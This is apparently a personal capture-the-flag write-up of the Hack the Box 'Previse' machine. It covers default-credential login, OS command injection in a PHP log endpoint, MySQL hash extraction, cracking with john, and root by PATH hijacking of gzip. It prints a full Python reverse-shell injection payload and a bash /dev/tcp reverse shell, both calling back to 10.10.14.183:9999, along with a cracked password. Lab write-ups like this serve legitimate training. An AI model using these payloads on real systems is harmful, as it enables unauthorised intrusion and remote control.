# Previse Box Writeup

## Sean Kannanaikal 10/14/2021 - 10/15/2021

Previse is a machine on Hack the Box with an average rating of 4.0 difficulty, although considered to be easy it is definetely one of the harder machines I have broken into.  I believe it was the perfect box for me to exploit especially after working through a few of the labs located Portswigger's web security academy for web application penetration testing.

***

## Information Gathering

As with many pentetration tests I started off this box with a simple nmap scan

```
nmap 10.10.11.104
```

![image1](images/Capture1.PNG)

I ended up finding both an SSH port and a Webserver on port 80.  From past experience I knew that SSH enumeration would be very difficult so I ended up resorting to investigating the webserver.

## Port 80 enumeration

I ended up firing up a browser and visited the ip address to see what application was being hosted on the machine.  I ended up getting sent to the login page down below.

![image2](images/capture2.PNG)

Before proceeding I started trying some basic default credential combinations until I found the admin account was using a username of *admin* and a password of *admin*.

Once logged into the server I got around to exploring the site and found that there is some sort of database in the background where the web application was calling from to keep track of users and files that would be uploaded to the server.  When I went to search through the uploaded files I ended up finding a interesting zip file titled *sitebackup.zip*.

![image3](images/capture3.PNG)

I decided to download the zip file and ended up finding a list of php files with the same code the actual server was running with.  I started going through many of the php files and I eventually found a file titled *logs.php* and in there I noticed that the server would end up making a system exec call intended to run a python program.  Suprisingly enough a few hours before I learned about the OS command injection vulnerability that many web apps can be exploited with.  So I instantly recognized this vulnerability and tried to figure out how I could make a request to the server where I could send malicious commands.

## Port 80 exploitation

After firing up burp and exploring through the site I found my answer in the request log data web page on the site.  I would be able to make a request to the server to run the python script and return a log file containing all file requets made.  With this in hand I decided to go ahead and try to manipulate the request.

![image4](images/capture4.PNG)

Displayed above is the request I intercepted and manipulated by inserting the code

```
space; python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.183", 9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Persistence

Before I forwareded the request I also opened up a nc listener on my kali box so we could begin interacting with the server directly in order to maintain access with the system.

```
nc -lvp 9999
```

After this I forwarded the request and voila I had a basic shell with the user www-data.

### Before
![image5](images/capture5.PNG)

### After
![image6](images/capture6.PNG)



## Initial Access

I started exploring around and found the user.txt file but I was unable to open it as it was under the ownership of the user m4lwhere.  So I got stuck and tried to login to the user viawith some basic credentials to no avail.  After quite a long time of thinking I remembered that the file storage system contained a database that not only contained files uploaded to the server but also information regarding users.

I also remembered that I had obtained the credentials to the mysql database from the config.php file from the sitebackup.zip I had obtained earlier.  I logged into the mysql database and I ran into one little problem I was not getting the standard output most likely because the reverse shell I was using was not very complicated and fairly simple.

After playing around with the shell and mysql for a bit I found that if I execute a command and then force an error in mysql by running a bad command I can get the output from the previous command that was correctly entered.  With a little bit of trouble I was eventually able to find the users table in the previse database and got a hash for the m4lwhere user.

![image7](images/capture7.PNG)

*m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.*

## Privliege Escalation

I ended up trying to identify the hash it was and noticed the starting three characters of $1$ and recognized it as an md5 hash.  I quickly fired up john the ripper to go at it with the command listed below.

```
john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

![image8](images/capture8.PNG)

Eventually it cracked the has and I found the password to be *ilovecody112235!*.

## Continued Access

With the credentials for the m4lwhere user in hand I logged into the account via ssh and got a prompt.  I read the user.txt file and was successfully able to obtain the first milestone of the box.

![image9](images/capture9.PNG)

## Privliege escalation

Now I had to escalate my privlieges to root and I will have successfully owned the box.  

I wanted to figure out if the user account had any root privlieges associated with the account and foudn that we in fact did.

![image10](images/capture10.PNG)

It seems I can run a bash script as root.

I decided to see specifically what the script would do to see if I could leverage it to obtain root access.

![image11](images/capture11.PNG)

I ended up seeing the contents of the file and noticed it was a script for generating zip files of logs from the previous day.  I ran the command and indeed as I had predicted it generated a new set of log files from the previous day's activities.

I knew my ticket to exploiting the box was in this script but I wasn't exactly sure what specifically. Initially I tried to edit the script but I did not have the permissions to do so.  I also tried to rename a script that I created to the same name as the initial script but that route was also denied.

I began thinking of a new methodology I could take and realized that the script was using the gzip command.  I ended up making a malicious binary titled gzip in m4lwhere's home directory and then proceeded to manipulate the PATH environment variable by prepending m4lwhere's home directory so it would locate the malicious gzip binary prior to the legitimate one.  

I did this with the command listed below.
```
export PATH=.:$PATH
```

On my kali box I loaded up a quick reverse shell

```
nc -lvp 9999
```

and wrote my malicious gzip binary with the code below.

```
#! /bin/bash
bash -i >& /dev/tcp/10.10.14.183/9999 0>&1
```

I ran the script with sudo privlieges and boom I got myself a rootshell.  

![image12](images/capture12.PNG)

## Final Steps
I moved to the root home directory and read the conetnts of root.txt and successfully pwned the machine.

![image13](images/capture13.PNG)
